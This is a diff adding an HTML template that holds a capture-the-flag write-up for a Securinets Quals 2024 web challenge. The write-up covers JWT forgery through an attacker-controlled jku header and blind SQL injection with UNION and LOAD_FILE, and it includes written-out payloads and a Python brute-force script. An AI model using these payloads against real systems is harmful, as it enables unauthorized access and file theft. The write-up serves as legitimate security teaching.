@@ -1,0 +1,137 @@
+{% extends 'base.html' %}
+
+{% block title %}
+	Home
+{% endblock %}
+
+{% block content %}
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
+
+<div class="writeup_container">
+	<div class="writeup_title">
+		<p><i># Securinets Quals 2024 Writeup </i><p>
+	</div>
+	<div class="writeup_content">
+		<p>
+			CTF weight : 95.96<br>
+			Placement: 16/332<br>
+		</p>
+
+		Tasks:
+		<div class="writeup_tasks">
+			<a href="#mement0o" class="link hard">> [330] MeMent0o~#? </a>
+		</div>
+		<br><br>
+
+		<div id="mement0o">
+			<h1>MeMent0o~#?</h1>
+			<p>
+				points: 330<br>
+				solves: 18<br>
+			</p>
+			<p>
+				In this challenge we are given the source code of the website.<br>
+				We also get informed that the website is active on two ports <em class="sm">80</em> and <em class="sm">1234</em><br>
+				<div class="files">Files: <a href="#">mement0o.zip</a></div>
+				<h3>PART 1: Understanding </h3>
+				At first we visit the first app which is running on port 80 <a href="http://web1.securinets.tn:80/" target="_blank" class="link">http://web1.securinets.tn:80/</a><br>
+				we find a nav bar with two button register and login,so we tried making a new account,but after that something weird happens<br>
+				everytime we visit any page we keep getting the error <em class="sm">ERR_TOO_MANY_REDIRECTS</em>.<br>
+				there is probably somthing* in the code that does more than 20 redirects which is the max of most browsers<br>
+				<br>
+				okay now enoguh with that let's visit the second url <a href="http://web1.securinets.tn:1234/" target="_blank" class="link">http://web1.securinets.tn:1234/</a>.</br>
+				NVM, we got a response but it's just a <em class="sm">404 page not found</em> :((<br>
+				<br>
+				<h3>PART 2: Source code review</h3>
+				Okay.. now we have clear mission. let's find out where are all of these redirects coming from<br>
+				the first app running on port 80 is writting in <em class="um">python/flask</em>
+				and after reading the app.py file we found out there are three paths.<br>
+				<em class="wm">/notes</em>,  <em class="wm">/note/&lt;int:note_id></em> and <em class="wm">/note/&lt;int:note_id>/delete</em><br>
+				and exactly in <em class="wm">/notes/</em> we find a of possibility SQL Injection. since they are taking user's inputs directly and inserting it through query!<br>
+				but if we want to somehow mess with this. we see that all of these routes call <em class="um">@admin_required</em><br>
+				<div class="img"><img src=https://s6.imgcdn.dev/Hy06C.png /></div>
+				this code checks if our username is admin to gives up permessions. so as I tried creating a user with name "admin" but seemed like a user with that username already exists. so the app doesn't allow us to create a new one with that username...<br>
+				we know that somehow we need to get admins creds in order to login with admin account and potentially try some SQL injection.<br>
+				<br>
+				DEAD END--- let's try to look at the other app in port 1234 which is written in golang <br>
+				we found 4 routes on this app<br>
+				<div class="img"><img src=https://s6.imgcdn.dev/Hy7Ue.png /></div>
+				however <em class="wm">/get_creds</em> and <em class="wm">/get_secret_key</em> requires admin authentication.<br>
+				something interesting about this app is that it uses JWT auth. so let's try to understand how it works and how are they verifying if whether I'm the admin or not.<br>
+				I tried sending post request to <em class="wm">/register</em> with a random username and password (testy:testy). and got this website<br>
+				<div class="img"><img src=https://s6.imgcdn.dev/HyBV0.png /></div>
+				after pasting this JWT token into <a class="link" href="https://jwt.io/">jwt.io</a> we get this result.
+				<div class="img"><img src=https://s6.imgcdn.dev/HyGpM.png /></div>
+				<br>
+				<h3>PART 3: JWT corruption</h3>
+				reminder: we have a path called <em class="um">/get_creds</em> which expect a user_token and return the user credentials (username,password)<br>
+				and there is also <em class="um">/get_token</em> which expects a JWT and returns the user_token which we can use in <em class="um">/get_creds</em> <br>
+				after 1 hour of trying to simply just change username in the payload to admin and resign the JWT token again using the private key.<br>
+				I kept getting an error while sending it to <em class="um">/get_creds</em> which says <em class="sm">Invalid token: invalid signature*</em>.
+				it was confirmed by the author that the keypair.pem in the source code is changed on production. so simply don't have the private key that is being used ϖ_ϖ<br>
+				<br>
+				hmm so there must something else. what is this jku in the headers?<br>
+				after digging through the code and understanding it better it looks like they are stroing the public key inside the the path <em class="um">./well-known/jwks.json</em> and refering to it into the headers. <br>
+				localhost:8080 is refering to the app running on port 1234 in this case, we can confirm that by reading the docker-compose.yml <em class="wm">ports: - "1234:8080"</em> <br>
+				and here is how their code retrive the public key to verify the validation of the JWT token:<br>
+				<div class="img"><img src=https://s6.imgcdn.dev/Hyrsd.png /></div>
+				<div class="img"><img src=https://s6.imgcdn.dev/Hyv2l.png /></div>
+				the app is simply sending get request to whatever is the jku header is set to. retrieving the public key from it.<br>
+				which means... I can create a new keypair, craft a JWT token with <em class="wm">username: admin</em> set the jku header to <em class="um">http://mywebsite/jku</em> where im placing my public key over there and then sign it using my private key. 
+				btw there were some some <a target="_blank" href="https://stackoverflow.com/questions/43867440/whats-the-meaning-of-the-kid-claim-in-a-jwt-token" class="link">kid</a> verifications, so I just used a copy of their function <em class="um">app.go/jwks()</em> with my publick key to create the jku url content<br> 
+
+				after sending this JWT to <em class="um">/get_token</em> we recieve a user_token and after sending that to <em class="um">/get_creds</em> we recieve this.<br>
+				<em class="gm"> admin:126b8b5bb9a20643693c64543a493bcd85f920ff </em><br>
+				we have the admin password now let's go back to first app and try to sign in.. it worked!!
+				<br>
+				<h3>PART 4: BLIND SQL INJECTION</h3>
+				here is the <em class="um">/notes</em> page preview from the admin account. we have a search bar where can use it to find notes using titles<br>
+				<div class="img"><img src=https://s6.imgcdn.dev/HUUdL.png /></div>
+
+				in part 4 we talked about the possibility of sql injection and here is the code we found in app.py<br>
+				<div class="img"><img src=https://s6.imgcdn.dev/HUP4B.png /></div>
+				let's ignore the POST part because it's about adding a new note and after looking throught it, it looks useless.<br>
+				so from what we see here they're taking our input searching if a title includes our {search} and returning the content, however there was a intendend bug in their site which instead of printing the content you just recieve a computer symbol if it matches. for example after leaving it empty which will lead to LIKE '%%' which should match everything we recieve 2 computer symbols which tells us there are two matches. 
+				<br>
+				<div class="img"><img src=https://s6.imgcdn.dev/HUT0u.png /></div>
+				at first i thought we can just leak the flag by changing the query so it checks if the content of the note includes my {input} as well before printing it, but then I realised the flag is not even in the database but it's in a text file /flag instead!<br> 
+				I started by sending <em class="gm"> %' AND 1=2;# </em> in the input field<br>
+				<pre class="code"><code class="language-sql">SELECT * FROM notes WHERE title LIKE '%%' AND 1=2;# %'</code></pre>
+				with this query we will get 0 outputs(computer symbols) because there is never a case where 1=2<br>
+				after asking chat GPT we find that mysql have a function called <a href="https://sqlnotebook.com/read-file-func.html" class="link"> READ_FILE</a> which returns the file content if found otherwise NULL<br>
+				with that I also used <a href="https://www.w3schools.com/sql/sql_union.asp" class="link">UNION</a> to bring more data into our SELECT and came up with this payload<br>
+				<em class="gm"> %' AND 1=2 UNION SELECT 1,2,3 FROM (SELECT LOAD_FILE('/flag') AS content) AS subquery WHERE content LIKE 'securi%';# </em><br>
+
+				<pre class="code"><code class="language-sql">SELECT * FROM notes WHERE title LIKE '%%' AND 1=2 UNION SELECT 1,2,3 FROM (SELECT LOAD_FILE('/flag') AS content) AS subquery WHERE content LIKE 'securi%';# %' </code></pre><br>
+				this will return a match since the content of /flag starts with securi know we have a payload that we can change anything instead of securi and if the content of file starts with that it will return a computer smybol otherwise it won't. so I made a simple python script to automate that<br>
+
+				<pre class="code"><code class="language-python">
+import requests
+import urllib.parse
+
+confirmed_flag = "sec" # first letters of flag
+url = "http://web1.securinets.tn/notes?search="
+alphas = "abcdefghijklmnopqrstuvwxyz123456780{}"
+cookies = {"session":"28d1de0946822fb5_670afeb6.d0K5YwPnOxymhhshUUDPn7Lfqr0"}
+
+while True:
+    for alpha in alphas:
+        payload = f"%' AND 1=2 UNION SELECT 1,2,3 FROM( SELECT LOAD_FILE('/flag') AS content) AS subquery WHERE content LIKE '{confirmed_flag+alpha}%' ;#"
+        full_url = url+urllib.parse.quote_plus(payload) # url encode payload since it will be in the params
+		found = requests.get(full_url,cookies=cookies).text.count("&lt;h3&gt;") # each time we get a computer symbol it's inside an h3 tag
+        if found==1: 
+            confirmed_flag += alpha
+            break
+	print(confirmed_flag)</code></pre><br>
+				and after ~1 minute of excution of we get our flag
+				<div class="img"><img src=https://s6.imgcdn.dev/HU23i.png /></div>
+				<p>
+		</div>
+	</div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+
+
+{% endblock %}
